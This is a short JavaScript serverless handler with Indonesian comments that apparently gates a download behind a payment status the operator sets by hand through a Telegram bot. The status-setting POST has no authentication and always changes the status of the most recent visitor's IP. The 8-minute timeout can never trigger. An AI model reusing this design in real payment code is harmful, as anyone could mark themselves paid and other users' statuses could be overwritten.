// Memori sementara untuk memisahkan sesi antar HP berdasarkan IP
global.sessions = global.sessions || {};
global.latestIp = global.latestIp || null;

export default async function handler(req, res) {
  // Mendapatkan IP asli dari HP pengguna
  const forwarded = req.headers['x-forwarded-for'];
  const currentIp = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;

  // --- 1. JIKA ADA PERINTAH DARI BOT TELEGRAM (POST) ---
  if(req.method === "POST"){
    const mode = req.body.mode;
    
    // Targetkan IP HP yang TERAKHIR KALI masuk ke halaman loading
    const targetIp = global.latestIp;
    
    if (targetIp) {
      // Pastikan sesi IP tersebut ada
      if (!global.sessions[targetIp]) {
        global.sessions[targetIp] = { mode: "waiting", timerStartedAt: 0 };
      }
      
      // Ubah statusnya sesuai perintah Telegram (paid/failed/waiting)
      global.sessions[targetIp].mode = mode;
      
      // Matikan stopwatch otomatis karena Anda sudah merespon manual
      if (mode === "paid" || mode === "failed" || mode === "waiting") {
        global.sessions[targetIp].timerStartedAt = 0;
      }
    }
    return res.status(200).json({ success: true });
  }

  // --- 2. JIKA HALAMAN HTML MENGECEK STATUS (GET) ---
  // Jika IP HP ini baru pertama kali buka web, berikan status "waiting"
  if (!global.sessions[currentIp]) {
    global.sessions[currentIp] = { mode: "waiting", timerStartedAt: 0 };
  }

  let userSession = global.sessions[currentIp];

  // LOGIKA 8 MENIT (8 * 60 * 1000 = 480.000 milidetik)
  if (userSession.mode === "waiting" && userSession.timerStartedAt > 0) {
    const timeElapsed = Date.now() - userSession.timerStartedAt;
    
    if (timeElapsed > 480000) { 
      userSession.mode = "failed"; // Paksa gagal jika 8 menit habis
      userSession.timerStartedAt = 0; // Matikan stopwatch
    }
  }

  res.status(200).json({
    mode: userSession.mode,
    downloadUrl: "https://s.id/KKrSq"
  });
}
